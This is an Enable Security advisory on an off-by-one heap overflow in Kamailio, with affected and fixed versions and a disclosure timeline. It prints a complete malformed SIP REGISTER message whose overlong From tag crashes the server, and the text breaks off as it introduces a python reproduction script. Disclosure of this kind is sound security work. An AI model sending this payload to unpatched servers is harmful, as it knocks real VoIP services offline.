'''
# Off-by-one heap overflow in Kamailio

- Authors:
    - Alfred Farrugia &lt;alfred@enablesecurity.com&gt;
    - Sandro Gauci &lt;sandro@enablesecurity.com&gt;
- Fixed versions: Kamailio v5.1.2, v5.0.6 and v4.4.7
- References: no CVE assigned yet
- Enable Security Advisory: &lt;https://github.com/EnableSecurity/advisories/tree/master/ES2018-05-kamailio-heap-overflow&gt;
- Tested vulnerable versions: 5.1.1, 5.1.0, 5.0.0
- Timeline:
    - Report date: 2018-02-10
    - Kamailio confirmed issue: 2018-02-10
    - Kamailio patch: 2018-02-10
    - Kamailio release with patch: 2018-03-01
    - Enable Security advisory: 2018-03-19

## Description

A specially crafted REGISTER message with a malformed `branch` or `From tag` triggers an off-by-one heap overflow.

## Impact

Abuse of this vulnerability leads to denial of service in Kamailio. Further research may show that exploitation leads to remote code execution.

## How to reproduce the issue

The following SIP message was used to reproduce the issue with a `From` header containing the `tag` that triggers the vulnerability:


```
REGISTER sip:localhost:5060 SIP/2.0
Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394
To: &lt;sip:1@localhost:5060&gt;
From: Test &lt;sip:2@localhost:5060&gt;;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg
Call-ID: 8b113457-c6a6-456a-be68-606686d93c38
Contact: sip:1@127.0.0.1:53497
Max-Forwards: 70
CSeq: 10086 REGISTER
User-Agent: go SIP fuzzer/1
Content-Length: 0

```

We used this python script to reproduce the crash:
'''